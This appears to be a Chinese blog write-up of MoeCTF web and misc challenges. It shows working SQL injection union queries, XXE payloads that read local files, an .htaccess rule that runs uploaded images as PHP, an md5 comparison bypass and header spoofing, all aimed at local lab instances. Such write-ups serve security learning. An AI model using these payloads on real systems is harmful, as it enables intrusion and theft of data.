波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。</span><br></pre></td></tr></table></figure>
<p>通过<code>https://lhlnb.top/hajimi/base64</code>解密后得到：</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬&#123;‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌<span class="keyword">try</span>‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍<span class="literal">_</span>‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬<span class="literal">_</span>‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography&#125;</span><br></pre></td></tr></table></figure>
<p>零宽字符隐写，解出来为flag：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">moectf</span>&#123;<span class="number">1</span>b8956b9-a423-<span class="number">4101</span>-a1bd-<span class="number">65</span>be33682c82&#125;</span><br></pre></td></tr></table></figure>





<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="0-Web入门指北"><a href="#0-Web入门指北" class="headerlink" title="0 Web入门指北"></a><strong>0 Web入门指北</strong></h3><p>考点：JavaScript，JSFuck</p>
<p>所给文本输入到控制台回车即可。<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810224401937.png" alt="image-20250810224401937"></p>
<h3 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a><strong>01 第一章 神秘的手镯</strong></h3><p><strong>考察：前端可改</strong></p>
<p>直接输不进去，直接抓包该包或者F12直接改即可。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809093143395.png" alt="image-20250809093143395"></p>
<h3 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a><strong>02 第二章 初识金曦玄轨</strong></h3><p><strong>考察： 抓包</strong></p>
<p>前往&#x2F;golden_trail路由并抓包，</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809092831525.png" alt="image-20250809092831525"></p>
<h3 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a><strong>03 第三章 问剑石！篡天改命！</strong></h3><p><strong>考察： f12,  抓包，传参</strong></p>
<p>f12看到前端script源码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testTalent</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=B&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                   <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                   <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                       <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                   &#125;,</span></span><br><span class="line"><span class="language-javascript">                   <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;none&#x27;</span> &#125;)</span></span><br><span class="line"><span class="language-javascript">               &#125;);</span></span><br><span class="line"><span class="language-javascript">               </span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">textContent</span> = data.<span class="property">result</span>;</span></span><br><span class="line"><span class="language-javascript">               </span></span><br><span class="line"><span class="language-javascript">               <span class="comment">// 显示/隐藏光芒效果</span></span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">const</span> glow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;glow&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span> (data.<span class="property">result</span>.<span class="title function_">includes</span>(<span class="string">&#x27;流云状青芒&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                   glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">               &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                   glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">               </span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                   <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                       <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨\n\n天赋篡天术大成！`</span>);</span></span><br><span class="line"><span class="language-javascript">                   &#125;, <span class="number">500</span>);</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">           &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="title function_">alert</span>(<span class="string">&#x27;玄轨连接中断！请检查灵枢...&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">           &#125;</span></span><br><span class="line"><span class="language-javascript">       &#125;</span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>且题目描述的参数提示为：<strong>S，光芒：流云状青芒(flowing_azure_clouds)的异象</strong><br>于是改包：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test_talent?level=S</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:64313</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not?A_Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;130&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:64313</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:64313/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;manifestation&quot;</span><span class="punctuation">:</span><span class="string">&quot;flowing_azure_clouds&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>即可达成条件：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/1754704474303.jpg" alt="1754704474303"></p>
<h3 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a><strong>04 第四章 金曦破禁与七绝傀儡阵</strong></h3><p><strong>考察：http协议</strong></p>
<p>题目描述已经给出了要改的请求头具体是什么，直接跟着提示走就行。</p>
<p>GET传参: key&#x3D;<br>bW9lY3Rme0Mw</p>
<p>POST传参: declaration&#x3D;织云阁&#x3D;第一<br>bjZyNDd1MTQ3</p>
<p>X-Forwarded-For: 127.0.0.1<br>MTBuNV95MHVy</p>
<p>改User-Agent: moe browser<br>X2g3N1BfbDN2</p>
<p>改Cookie: user&#x3D;xt<br>M2xfMTVfcjM0</p>
<p>Referer: <a target="_blank" rel="noopener" href="http://panshi/entry">http://panshi/entry</a><br>bGx5X2gxOWgh</p>
<p>PUT发送”新生！”<br>fQ&#x3D;&#x3D;</p>
<p>最后拼接base64解密即可。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809102826870.png" alt="image-20250809102826870"></p>
<h3 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a><strong>05 第五章 打上门来！</strong></h3><p><strong>考察：目录穿越</strong></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809100920501.png" alt="image-20250809100920501"></p>
<h3 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a><strong>06 第六章 藏经禁制？玄机初探！</strong></h3><p><strong>考察：sql注入， 一句话密码</strong></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809103054218.png" alt="image-20250809103054218"></p>
<h3 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a><strong>07 第七章 灵蛛探穴与阴阳双生符</strong></h3><p>考察：robots协议认识， md5碰撞</p>
<p>题目描述得知hint在robots.txt这个路由中，访问得到提示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/flag.php</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;flag.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>; error <span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>分析：<br>初步得知flag在环境变量中，要a,b两个变量不同，但md5值要相同。搜索便可知道考察的是md5碰撞，随便用两个例子即可：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag.php?<span class="attribute">a</span>=QNKCDZO&amp;b=s878926199a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809103705485.png" alt="image-20250809103705485"></p>
<h3 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a><strong>08 第八章 天衍真言，星图显圣</strong></h3><p>考察：sql注入， 联合查询</p>
<p>类似：<code>select * from table where username=admin  and password=1</code></p>
<p>闭合：</p>
<p><code>http://127.0.0.1:51896/?username=admin&amp;password=&#39; or 1=1 %23</code>显示正常，说明单引号闭合。</p>
<p>行数：</p>
<p>order by&#x2F;联合查询union select测试出行数为2。</p>
<p><code>http://127.0.0.1:51896/?username=admin&amp;password=&#39; union select 1,2 %23</code>发现显示位是1处。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810010141567.png" alt="image-20250810010141567"></p>
<p>联合查询注入即可。</p>
<p>表：</p>
<p><code>http://127.0.0.1:51896/?username=admin&amp;password=&#39; union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() %23</code></p>
<p>列：</p>
<p><code>http://127.0.0.1:51896/?username=admin&amp;password=&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#39;  &#39;</code></p>
<h3 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a><strong>Moe笑传之猜猜爆</strong></h3><p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810004843141.png" alt="image-20250810004843141"></p>
<p>查看源码发现在猜对之后会向&#x2F;flag路由发送一个空的POST请求便会返回flag的json形式数据。<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810005037719.png" alt="image-20250810005037719"></p>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a><strong>09 第九章 星墟禁制·天机问路</strong></h3><p>考点：shell命令</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093146120.png" alt="image-20250816093146120"></p>
<h3 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a><strong>13 第十三章 通幽关·灵纹诡影</strong></h3><p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093936526.png" alt="image-20250816093936526"></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093722827.png" alt="image-20250816093722827"></p>
<p>flag为：<code>moectf&#123;d29c9f6c-4035-fa03-b5c9-58e93581344a&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093845651.png" alt="image-20250816093845651"></p>
<h3 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a><strong>14 第十四章 御神关·补天玉碑</strong></h3><p>考察：文件上传，apache配置文件解析漏洞</p>
<p>同时上传刚刚的info.jpg和.htaccess文件，内容如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<h3 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a><strong>12 第十二章 玉魄玄关·破妄</strong></h3><p>考点：RCE, 一句话木马初识</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816094557113.png" alt="image-20250816094557113"></p>
<h3 id="摸金偶遇FLAG，拼尽全力难战胜"><a href="#摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="摸金偶遇FLAG，拼尽全力难战胜"></a><strong>摸金偶遇FLAG，拼尽全力难战胜</strong></h3><p>看题目描述，是个脚本题。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816094811605.png" alt="image-20250816094811605"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:55856/&quot;</span></span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line">start = req.get(base_url + <span class="string">&quot;get_challenge&quot;</span>, params=&#123;<span class="string">&quot;count&quot;</span>: <span class="number">9</span>&#125;)</span><br><span class="line">question = start.json()</span><br><span class="line"><span class="built_in">print</span>(question)</span><br><span class="line"><span class="keyword">if</span> question:</span><br><span class="line">    answers = question[<span class="string">&quot;numbers&quot;</span>]</span><br><span class="line">    token = question[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    answer = req.post(base_url + <span class="string">&quot;verify&quot;</span>, json=&#123;<span class="string">&quot;answers&quot;</span>: answers, <span class="string">&quot;token&quot;</span>: token&#125;, headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(answer.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-第十章-天机符阵"><a href="#10-第十章-天机符阵" class="headerlink" title="10 第十章 天机符阵"></a><strong>10 第十章 天机符阵</strong></h3><p>省流：flag在flag.txt里</p>
<p>考点：xxe，apache主目录</p>
<p>随便输入1，发现回显跟xml有关，且提示和某种特定结构有关，猜测应该是打xxe。</p>
<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不在根目录下，于是猜测是不是在&#x2F;var&#x2F;www&#x2F;html下，flag:</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816100336696.png" alt="image-20250816100336696"></p>
<h3 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a><strong>11 第十一章 千机变·破妄之眼</strong></h3><p>考点：脚本，文件包含，伪协议</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816102907000.png" alt="image-20250816102907000"></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816114743022.png" alt="image-20250816114743022"></p>
<h3 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a><strong>10 第十章 天机符阵_revenge</strong></h3><p>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816191544848.png" alt="image-20250816191544848"></p>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="01-第一章-神秘的手镯-revenge"><a href="#01-第一章-神秘的手镯-revenge" class="headerlink" title="01 第一章 神秘的手镯_revenge"></a><strong>01 第一章 神秘的手镯_revenge</strong></h3><p>考点：.bak备份文件认识</p>
<p>根据题目描述，有一个wanyanzhou.txt的备份，根据常见备份文件后缀猜测出是wanyanzhou.txt.bak。</p>
<p>F12，按 Ctrl&#x2F;Cmd+F8 关闭所有断点，输入备份文件的内容，抓包发500次即可得到：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250824131004.png" alt="20250824131004"></p>
<p>flag为：<code>moectf&#123;0f348e84-86db-554c-3ff4-c6492ccc47a7&#125;</code></p>
<h3 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a><strong>15 第十五章 归真关·竞时净魔</strong></h3><p>考点：文件上传，条件竞争，双后缀绕过<br>本题有提示：</p>
